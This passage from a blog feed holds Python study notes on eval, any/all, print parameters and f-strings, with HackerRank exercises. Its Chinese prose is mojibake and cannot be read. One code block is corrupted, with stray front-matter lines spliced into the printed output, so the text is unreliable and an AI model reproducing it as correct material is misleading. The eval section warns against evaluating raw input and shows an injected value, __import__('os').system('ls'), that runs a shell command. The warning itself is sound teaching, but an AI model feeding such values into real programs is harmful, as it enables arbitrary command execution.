class="built_in">exec</span>(<span class="string">f&quot;user_dict=<span class="subst">&#123;user&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">5</span>]: user_dict</span><br><span class="line">Out[<span class="number">5</span>]: &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;jim&#x27;</span>, <span class="string">&#x27;sex&#x27;</span>: <span class="string">&#x27;male&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">18</span>&#125;</span><br></pre></td></tr></table></figure></p></li></ol><h3 id="ä¸è¦æ»¥ç”¨-eval">ä¸è¦æ»¥ç”¨ eval</h3><blockquote><p>åœ¨å¼€å‘æ—¶ï¼Œåƒä¸‡ä¸è¦ä½¿ç”¨ eval ç›´æ¥è½¬æ¢ input çš„ç»“æœ</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">__import__</span>(<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;ls&#x27;</span>)</span><br></pre></td></tr></table></figure><p>ç­‰ä»·ä»£ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&#x27;ç»ˆç«¯å‘½ä»¤&#x27;</span>)</span><br></pre></td></tr></table></figure><p>æ‰§è¡ŒæˆåŠŸï¼Œè¿”å› 0</p><p>æ‰§è¡Œå¤±è´¥ï¼Œè¿”å›é”™è¯¯ä¿¡æ¯</p><p><a href="https://www.geeksforgeeks.org/eval-in-python/">eval inPython</a></p><h2 id="eval-alternative-function-reference">eval alternative: functionreference</h2><p>è§ Python variables and parameters feature ä¸€æ–‡ ä»¥åŠ <ahref="https://www.hackerrank.com/challenges/string-validators/forum">string-validators_forum</a></p><h2 id="any-å‡½æ•°">any å‡½æ•°</h2><h3 id="definition-and-usage">Definition and Usage</h3><p>The <code>any()</code> function returns True if any item in aniterable are true(å…ƒç´ é™¤äº†æ˜¯ 0ã€ç©ºã€FALSE å¤–éƒ½ç®— TRUEã€‚), otherwise itreturns False.</p><p>If the iterable object is empty, the <code>any()</code> function willreturn False.</p><h2 id="syntax">Syntax</h2><p>any(<em>iterable</em>)</p><h2 id="parameter-values">Parameter Values</h2><table><thead><tr class="header"><th>Parameter</th><th>Description</th></tr></thead><tbody><tr class="odd"><td><em>iterable</em></td><td>An iterable object (list, tuple, dictionary)</td></tr></tbody></table><p>Note: When used on a dictionary, the any() function checks if any ofthe keys are true, not the values.</p><h2 id="all-å‡½æ•°">all å‡½æ•°</h2><p>The <code>all()</code> function returns True if all items in aniterable are true, otherwise it returns False.</p><p>If the iterable object is empty, the <code>all()</code> function alsoreturns True.</p><p>è¡¥å……ï¼š</p><blockquote><p>è¯­æ³•ç³–ï¼ˆSyntacticsugarï¼‰æ˜¯ç”±è‹±å›½è®¡ç®—æœºç§‘å­¦å®¶å½¼å¾—Â·å…°ä¸å‘æ˜çš„ä¸€ä¸ªæœ¯è¯­ï¼ŒæŒ‡è®¡ç®—æœºè¯­è¨€ä¸­æ·»åŠ çš„æŸç§è¯­æ³•ï¼Œè¿™ç§è¯­æ³•å¯¹è¯­è¨€çš„åŠŸèƒ½æ²¡æœ‰å½±å“ï¼Œä½†æ˜¯æ›´æ–¹ä¾¿ç¨‹åºå‘˜ä½¿ç”¨ã€‚è¯­æ³•ç³–è®©ç¨‹åºæ›´åŠ ç®€æ´ï¼Œæœ‰æ›´é«˜çš„å¯è¯»æ€§ã€‚--wikipedia</p></blockquote><p>å‚è€ƒæ¨è:</p><p><a href="https://www.zhihu.com/question/20125256">Lambdaè¡¨è¾¾å¼æœ‰ä½•ç”¨å¤„ï¼Ÿå¦‚ä½•ä½¿ç”¨ï¼Ÿ</a> <ahref="https://foofish.net/lambda.html">ä»€ä¹ˆæ—¶å€™ä½¿ç”¨ Lambda å‡½æ•°ï¼Ÿ</a> <ahref="https://www.w3schools.com/python/ref_func_any.asp">Python any()Function</a> <ahref="https://www.w3schools.com/python/ref_func_all.asp">Python all()Function</a></p><p><a href="https://realpython.com/python-lambda/#lambda-calculus">Howto Use Python Lambda Functions</a></p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python input/output</title>
      <link href="/blog/2020/03/22/programming/python/1.basic/2.%20io/"/>
      <url>/blog/2020/03/22/programming/python/1.basic/2.%20io/</url>
      
        <content type="html"><![CDATA[<ul class="task-list"><li><label><input type="checkbox" />å¾…æ•´ç†</label></li></ul><p>å†™ç¨‹åºçš„ç›®çš„å°±æ˜¯è¦ä¸å¤–ç•Œè¿›è¡Œäº¤äº’ï¼Œé€šè¿‡è¾“å…¥è¾“å‡ºæ¥å®Œæˆä¸€å®šæ“ä½œï¼Œä»è€Œè§£å†³ä¸€å®šçš„é—®é¢˜ã€‚å› æ­¤ï¼Œè¾“å…¥ã€è¾“å‡ºçš„å¤„ç†ä¾¿æ˜¯éœ€è¦ç¨‹åºå‘˜æŒæ¡çš„ä¸€ä¸ªé‡ç‚¹å†…å®¹ã€‚æœ¬æ–‡ä¸»è¦è®°å½•è¾“å…¥è¾“å‡ºçš„ç›¸å…³å‡½æ•°ä»¥åŠå¸¸è§ç¼–ç¨‹æ–¹å¼ã€‚</p><h3 id="è¾“å‡º">è¾“å‡º</h3><p>print ä½œä¸º pythonä¸­æœ€å¸¸ç”¨è¾“å‡ºå‡½æ•°ï¼ŒåŠŸèƒ½æ¯”è¾ƒå¼ºå¤§ï¼Œæ‰€ä»¥å•ç‹¬è®°å½•ï¼Œå¹¶ç»ƒä¹ ä¸€ä¸‹ã€‚</p><h4 id="åŸç†">åŸç†</h4><p>å½“æˆ‘ä»¬ä½¿ç”¨ <code>print(obj1, obj2)</code> åœ¨ consoleä¸Šæ‰“å°å¯¹è±¡çš„æ—¶å€™ï¼Œå®è´¨ä¸Šè°ƒç”¨çš„æ˜¯<code>sys.stdout.write(obj1+" "+obj2+'\n')</code></p><p>Will be converted to string before printed</p><p><code>print</code>å¯ä»¥è¾“å‡ºä»»æ„å¯¹è±¡ï¼Œä½†æ˜¯éœ€è¦å…ˆå°†å…¶è½¬æ¢ä¸ºå­—ç¬¦ä¸²çš„åŸå› æ˜¯ï¼š<code>sys.stdout.write</code> åªèƒ½è¾“å‡ºå­—ç¬¦ä¸²ã€‚</p><p><code>sys.stdout.write</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">20</span>]: <span class="built_in">print</span>(<span class="string">&quot;hello&quot;</span>,<span class="string">&quot;world&quot;</span>)</span><br><span class="line">hello world</span><br><span class="line"></span><br><span class="line">In [<span class="number">23</span>]: sys.stdout.write(<span class="string">&quot;hello&quot;</span>+<span class="string">&quot; &quot;</span>+<span class="string">&quot;world&quot;</span>+<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">hello world</span><br><span class="line">Out[<span class="number">23</span>]: <span class="number">12</span></span><br></pre></td></tr></table></figure><h3 id="syntax">Syntax</h3><p><code>print(object(s), sep=separator, end=end, file=file, flush=flush)</code></p><p>== <code>sys.stdout.write(str(object(s))+"\n")</code></p><h3 id="parameter-values">Parameter Values</h3><table><colgroup><col style="width: 14%" /><col style="width: 85%" /></colgroup><thead><tr class="header"><th style="text-align: center;"><em>object(s)</em></th><th>Any object, and as many as you like. Will be converted to stringbefore printed</th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">sep='<em>separator</em>'</td><td>Optional. Specify how to separate the objects, if there is more thanone. Default is ' '</td></tr><tr class="even"><td style="text-align: center;">end='<em>end</em>'</td><td>Optional. Specify what to print at the end. Default is '\n' (linefeed)</td></tr><tr class="odd"><td style="text-align: center;"><em>file</em></td><td>Optional. An object with a write method. Default is sys.stdout</td></tr><tr class="even"><td style="text-align: center;"><em>flush</em></td><td>Optional. A Boolean, specifying if the output is flushed (True) orbuffered (False). Default is False</td></tr></tbody></table><p>è®°å½•ä¸€ä¸‹ä¸ç†Ÿæ‚‰ä¸”é‡è¦çš„å‚æ•°çš„ä½¿ç”¨ã€‚</p><h3 id="separator">separator</h3><p>å½“ <code>print</code> è¾“å‡ºå¤šä¸ªå¯¹è±¡æ—¶ï¼Œ é»˜è®¤æ˜¯ä»¥ç©ºæ ¼åˆ†å‰²ï¼Œå³:<code>sep=" "</code> , å¦‚æœæƒ³è¦ä¿®æ”¹ï¼Œæ˜¾å¼åœ°æ·»åŠ è¯¥å‚æ•°å³å¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">31</span>]: <span class="built_in">print</span>(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;world&quot;</span>, sep=<span class="string">&quot;--&quot;</span>)</span><br><span class="line">hello--world</span><br></pre></td></tr></table></figure><h3 id="end">end</h3><p>æ§åˆ¶æ‰“å°çš„ç»“å°¾ï¼Œé»˜è®¤æ˜¯ï¼š <code>end='\n'</code> ï¼Œ å³:<code>print</code> é»˜è®¤è¾“å‡ºæ¢è¡Œã€‚ å¦‚æœæƒ³è¦ä¸æ¢è¡Œï¼Œ æ˜¾å¼ä¿®æ”¹ end å‚æ•°:<code>end=""</code></p><p>å¦‚æœæƒ³æ‰“å°ä»¥ç©ºæ ¼ç»“å°¾ï¼Œå¯ä»¥ä½¿ç”¨ä¸‹é¢ä»£ç ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(obj1,obj2, end=<span class="string">&#x27; &#x27;</span>)</span><br></pre></td></tr></table></figure><p>end é»˜è®¤æ˜¯ '' ï¼Œ æ‰€ä»¥ä¼šè¾“å‡ºç©ºæ ¼</p><h3 id="file">file</h3><p>file ç”¨æ¥æ”¹å˜ print è¾“å‡ºæµï¼Œé»˜è®¤è¾“å‡ºåˆ° <code>sys.stdout</code> ã€‚å®ƒå¯ä»¥å‘æŒ¥ä¸¤ä¸ªé‡è¦ä½œç”¨ï¼š</p><ol type="1"><li><p>è¾“å‡ºåˆ° <code>stderr</code> (æ³¨ï¼šäº†è§£ stderrï¼Œ çœ‹æ–‡æœ«æ‰©å±•)</p><p>è¿™ä¸ªåŠŸèƒ½ï¼Œæ—¥å¸¸å°è„šæœ¬ç”¨ä¸åˆ°ï¼Œä½†æ˜¯åšä¸€äº›å¤§ç‚¹çš„é¡¹ç›®çš„æ—¶å€™ï¼Œè¿˜æœ‰æœ‰ç”¨çš„ã€‚</p></li><li><p>è¾“å‡ºåˆ°å¤–éƒ¨æ–‡ä»¶ï¼Œå’Œ fp æŒ‡é’ˆçš„ writeåŠŸèƒ½ç›¸ä¼¼ï¼Œä½†æ˜¯æ³¨æ„ï¼šå†™äºŒè¿›åˆ¶æ–‡ä»¶æ—¶ï¼Œä¸èƒ½ç”¨å®ƒï¼Œéœ€è¦ä½¿ç”¨æ–‡ä»¶çš„ writeæ–¹æ³•ã€‚</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">8</span>]: <span class="built_in">print</span>(<span class="string">&quot;Hello World&quot;</span>, file=sys.stderr)</span><br><span class="line">Hello World</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">13</span>]: <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;sample&quot;</span>, <span class="string">&quot;a&quot;</span>, encoding=<span class="string">&quot;utf8&quot;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">    ...:     <span class="built_in">print</span>(<span class="string">&quot;Hello World&quot;</span>, file=fp)</span><br><span class="line">    ...:</span><br><span class="line"></span><br><span class="line">In [<span class="number">14</span>]: cat sample</span><br><span class="line">Hello World</span><br></pre></td></tr></table></figure><h3 id="flush">flush</h3><p>flush -- è¾“å‡ºæ˜¯å¦è¢«ç¼“å­˜é€šå¸¸å†³å®šäº fileï¼Œä½†å¦‚æœ flush å…³é”®å­—å‚æ•°ä¸ºTrueï¼Œæµä¼šè¢«å¼ºåˆ¶åˆ·æ–°ã€‚ ä½¿ç”¨ flush å‚æ•°ç”Ÿæˆä¸€ä¸ª Loading çš„æ•ˆæœï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;---RUNOOB EXAMPLE ï¼š Loading æ•ˆæœ---&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Loading&quot;</span>,end = <span class="string">&quot;&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;.&quot;</span>,end = <span class="string">&#x27;&#x27;</span>,flush = <span class="literal">True</span>)</span><br><span class="line">    time.sleep(<span class="number">0.5</span>)</span><br></pre></td></tr></table></figure><p>å‚è€ƒè‡ª:<ahref="https://www.runoob.com/python3/python-func-print.html">Pythonprint() å‡½æ•°</a></p><h3 id="print-é‡å¤æ‰“å°">print é‡å¤æ‰“å°</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">1</span>]: <span class="built_in">print</span>(<span class="string">&quot;-&quot;</span>*<span class="number">25</span>)</span><br><span class="line">----------------------mathjax: true</span><br><span class="line">---```</span><br><span class="line"></span><br><span class="line"><span class="comment">### å‚ç›´å¯¹é½</span></span><br><span class="line"></span><br><span class="line">ä½¿ç”¨åˆ¶è¡¨ç¬¦ `\t` åœ¨å‚ç›´æ–¹å‘å¯¹é½ã€‚</span><br><span class="line"></span><br><span class="line">```python</span><br><span class="line">In [<span class="number">8</span>]: <span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">   ...:     <span class="built_in">print</span>(<span class="string">&quot;1\t2\t3&quot;</span>)</span><br><span class="line">   ...:     <span class="built_in">print</span>(<span class="string">&quot;12\t13\t14&quot;</span>)</span><br><span class="line">   ...:</span><br><span class="line"></span><br><span class="line">In [<span class="number">9</span>]: main()</span><br><span class="line"><span class="number">1</span>       <span class="number">2</span>       <span class="number">3</span></span><br><span class="line"><span class="number">12</span>      <span class="number">13</span>      <span class="number">14</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="f-string-æ ¼å¼åŒ–è¾“å‡º">f-string æ ¼å¼åŒ–è¾“å‡º</h2><p>The idea behind f-strings is to make string interpolation simpler.F-strings provide a concise and convenient way to embed pythonexpressions inside string literals for formatting.</p><p>Note : F-strings are faster than the two most commonly used stringformatting mechanisms, which are % formatting and str.format().</p><h3 id="simple-syntax">Simple Syntax</h3><p>f-string çš„ä½¿ç”¨å‡ ä¹å’Œ <code>str.format()</code> ä½¿ç”¨æ–¹å¼å‡ ä¹ç±»ä¼¼,å½“ç„¶ï¼Œ ä½¿ç”¨å¤§å†™ <code>F</code> ä¹Ÿå¯ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">17</span>]: hug = <span class="string">&quot;hello&quot;</span></span><br><span class="line">In [<span class="number">18</span>]: year = <span class="number">2020</span></span><br><span class="line">In [<span class="number">20</span>]: <span class="string">f&quot;<span class="subst">&#123;hug&#125;</span> <span class="subst">&#123;year&#125;</span>&quot;</span></span><br><span class="line">Out[<span class="number">20</span>]: <span class="string">&#x27;hello 2020&#x27;</span></span><br></pre></td></tr></table></figure><p>åˆå­¦è€…å¾€å¾€è¯¯å°†å­—ç¬¦ä¸²å’Œå…¶ä»–ç±»å‹ï¼Œå¦‚ï¼šå­—ç¬¦ä¸²ï¼Œå¼‚å¸¸ç±»å‹è¿›è¡Œæ‹¼æ¥ï¼Œä»è€Œå¾—åˆ°ä¸€ä¸‹é”™è¯¯:<code>TypeError: can only concatenate str (not "int") to str</code> ,è¿™æ˜¯ç”±äº Python</p><h3 id="arbitrary-expression">arbitrary expression</h3><p>ç”±äº f å­—ç¬¦ä¸²æ˜¯åœ¨è¿è¡Œæ—¶è¿›è¡Œè®¡ç®—çš„ï¼Œå› æ­¤å¯å°†ä»»ä½•æœ‰æ•ˆçš„ Pythonè¡¨è¾¾å¼æ”¾å…¥å…¶ä¸­ã€‚</p><h4 id="arithmetic">arithmetic</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">29</span>]: <span class="string">f&quot;<span class="subst">&#123;<span class="number">2020</span>//<span class="number">521</span>&#125;</span> You Me &amp; Her <span class="subst">&#123;<span class="number">2</span>*<span class="number">5</span>//<span class="number">10</span>&#125;</span>&quot;</span></span><br><span class="line">Out[<span class="number">29</span>]: <span class="string">&#x27;3 You Me &amp; Her 1&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="function">function</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">double_value</span>(<span class="params">value</span>):</span><br><span class="line">    <span class="keyword">return</span> value*value</span><br><span class="line">num = <span class="number">4</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;double_value(num)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="method">method</h3><p>You also have the option of calling a method directly:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">38</span>]: test</span><br><span class="line">Out[<span class="number">38</span>]: <span class="string">&#x27;www.google.com&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">39</span>]: <span class="string">f&quot;<span class="subst">&#123;test.upper()&#125;</span>&quot;</span></span><br><span class="line">Out[<span class="number">39</span>]: <span class="string">&#x27;WWW.GOOGLE.COM&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="user-defined-class">user-defined class</h3><p>You could even use objects created from classes with f-strings.Imagine you had the following class: --è§æ–‡æœ«çš„åŸæ–‡(é“¾æ¥)ï¼Œç±»è¿˜æ²¡å¥½å¥½å­¦ï¼Œå…ˆä¸çœ‹å®ƒã€‚</p><h3 id="multiline-f-strings">Multiline f-Strings</h3><p>Remember that you need to place an f in front of each line of amultiline string.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>name = <span class="string">&quot;Eric&quot;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>profession = <span class="string">&quot;comedian&quot;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>affiliation = <span class="string">&quot;Monty Python&quot;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>message = (</span><br><span class="line"><span class="meta">... </span>    <span class="string">f&quot;Hi <span class="subst">&#123;name&#125;</span>. &quot;</span></span><br><span class="line"><span class="meta">... </span>    <span class="string">f&quot;You are a <span class="subst">&#123;profession&#125;</span>. &quot;</span></span><br><span class="line"><span class="meta">... </span>    <span class="string">f&quot;You were in <span class="subst">&#123;affiliation&#125;</span>.&quot;</span></span><br><span class="line"><span class="meta">... </span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>message</span><br><span class="line"><span class="string">&#x27;Hi Eric. You are a comedian. You were in Monty Python.&#x27;</span></span><br></pre></td></tr></table></figure><p>If you want to spread strings over multiple lines, you also have theoption of escaping a return with a <code>\</code> :</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; message = f&quot;Hi &#123;name&#125;. &quot; \</span><br><span class="line">...           f&quot;You are a &#123;profession&#125;. &quot; \</span><br><span class="line">...           f&quot;You were in &#123;affiliation&#125;.&quot;</span><br><span class="line">...</span><br><span class="line">&gt;&gt;&gt; message</span><br><span class="line">&#x27;Hi Eric. You are a comedian. You were in Monty Python.&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>But this is what will happen if you use <code>"""</code> :</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>message = <span class="string">f&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"><span class="meta">... </span>    Hi <span class="subst">&#123;name&#125;</span>.</span></span><br><span class="line"><span class="string"><span class="meta">... </span>    You are a <span class="subst">&#123;profession&#125;</span>.</span></span><br><span class="line"><span class="string"><span class="meta">... </span>    You were in <span class="subst">&#123;affiliation&#125;</span>.</span></span><br><span class="line"><span class="string"><span class="meta">... </span>&quot;&quot;&quot;</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>message</span><br><span class="line"><span class="string">&#x27;\n    Hi Eric.\n    You are a comedian.\n    You were in Monty Python.\n&#x27;</span></span><br></pre></td></tr></table></figure><p>å¤šè¡Œå­—ç¬¦ä¸²ä¼šåŒ…å«è·¨è¡Œæ¯è¡Œå¼€å¤´çš„ç¼©è¿›</p><h3 id="dictionaries">Dictionaries</h3><p>å¦‚æœ f-string ä¸­éœ€è¦ä½¿ç”¨å’Œå¤–å›´ä¸€æ ·çš„å¼•å·ï¼ˆå•åŒå¼•å·ï¼‰æ—¶ï¼Œå¯ä»¥ä½¿ç”¨<code>\</code> è½¬ä¹‰ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>comedian = &#123;<span class="string">&#x27;name&#x27;</span>: <span class="string">&#x27;Eric Idle&#x27;</span>, <span class="string">&#x27;age&#x27;</span>: <span class="number">74</span>&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">f&quot;The comedian is <span class="subst">&#123;comedian[<span class="string">&#x27;name&#x27;</span>]&#125;</span>, aged <span class="subst">&#123;comedian[<span class="string">&#x27;age&#x27;</span>]&#125;</span>.&quot;</span></span><br><span class="line">The comedian <span class="keyword">is</span> Eric Idle, aged <span class="number">74.</span></span><br></pre></td></tr></table></figure><p>If you use the same type of quotation mark around the dictionary keysas you do on the outside of the f-string, then the quotation mark at thebeginning of the first dictionary key will be interpreted as the end ofthe string.</p><h3 id="braces">Braces</h3><p>In order to make a brace appear in your string, you must use doublebraces:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">f&quot;&#123;&#123;74&#125;&#125;&quot;</span></span><br><span class="line"><span class="string">&#x27;&#123;74&#125;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Note that using triple braces will result in there being only singlebraces in your string:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">f&quot;&#123;&#123;<span class="subst">&#123;<span class="number">74</span>&#125;</span>&#125;&#125;&quot;</span></span><br><span class="line"><span class="string">&#x27;&#123;74&#125;&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>However, you can get more braces to show if you use more than triplebraces:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">f&quot;&#123;&#123;&#123;&#123;74&#125;&#125;&#125;&#125;&quot;</span></span><br><span class="line"><span class="string">&#x27;&#123;&#123;74&#125;&#125;&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="backslashes">Backslashes</h3><p>As you saw earlier, it is possible for you to use backslash escapesin the string portion of an f-string. However, you canâ€™t use backslashesto escape in the expression part of an f-string:</p><p>Note: Backslash Cannot be used in format string directly.(<code>\</code> ä¸èƒ½ç›´æ¥ç”¨åœ¨ {} é‡Œé¢)<code>f"newline: &#123;ord('\n')&#125;"</code> è¿™æ ·ä¼šæŠ¥é”™ But the documentationpoints out that we can put the backslash into a variable as a workaroundthough :</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">newline = <span class="built_in">ord</span>(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">f&quot;newline: <span class="subst">&#123;newline&#125;</span>&quot;</span></span><br></pre></td></tr></table></figure><h3 id="inline-comments">Inline Comments</h3><p>Expressions should not include comments using the <code>##</code>symbol. Youâ€™ll get a syntax error:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">f&quot;Eric is <span class="subst">&#123;<span class="number">2</span> * <span class="number">37</span> ##Oh my!&#125;</span>.&quot;</span></span><br><span class="line"></span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span></span><br><span class="line">    <span class="string">f&quot;Eric is <span class="subst">&#123;<span class="number">2</span> * <span class="number">37</span> ##Oh my!&#125;</span>.&quot;</span></span><br><span class="line"></span><br><span class="line">                                ^</span><br><span class="line">SyntaxError: f-string expression part cannot include <span class="string">&#x27;##&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="è¿›åˆ¶">è¿›åˆ¶</h2><p>é¢˜ç›®ï¼š <ahref="https://www.hackerrank.com/challenges/python-string-formatting/problem">string-formatting</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">print_formatted</span>(<span class="params">number</span>):</span><br><span class="line">    width = <span class="built_in">len</span>(<span class="string">f&quot;<span class="subst">&#123;number:b&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, number+<span class="number">1</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;i:&#123;width&#125;</span>d&#125; <span class="subst">&#123;i:&#123;width&#125;</span>o&#125; <span class="subst">&#123;i:&#123;width&#125;</span>X&#125; <span class="subst">&#123;i:&#123;width&#125;</span>b&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    n = <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">    print_formatted(n)</span><br></pre></td></tr></table></figure><h2 id="è¾“å…¥">è¾“å…¥</h2><ol type="1"><li><p>Problem 1:</p><p><ahref="https://www.hackerrank.com/challenges/finding-the-percentage/problem">finding-the-percen</a>tage</p></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 